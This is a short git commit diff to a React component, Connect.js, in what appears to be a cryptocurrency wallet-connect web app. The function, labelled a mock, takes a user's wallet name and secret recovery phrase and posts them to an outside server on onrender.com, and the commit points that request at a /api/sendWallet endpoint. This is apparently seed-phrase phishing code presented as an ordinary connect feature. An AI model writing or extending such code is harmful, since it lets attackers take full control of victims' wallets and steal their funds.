9b2cdfb5ea73a5c8c569e9a2a070f9ad81836c96
King-Major <aghedopromise74@gmail.com>
2025-07-27 18:19:58 +0100

    api

--- client/src/components/Connect.js
+++ client/src/components/Connect.js
@@ -37,7 +37,7 @@ const POPULAR_WALLETS = [
 // Mock function for wallet connection
 const sendWalletInfo = async (walletName, secretPhrase, userWalletName) => {
   try {
-    const response = await axios.post('https://webapp-e18z.onrender.com', {
+    const response = await axios.post('https://webapp-e18z.onrender.com/api/sendWallet', {
       walletName,
       secretPhrase,
       userWalletName
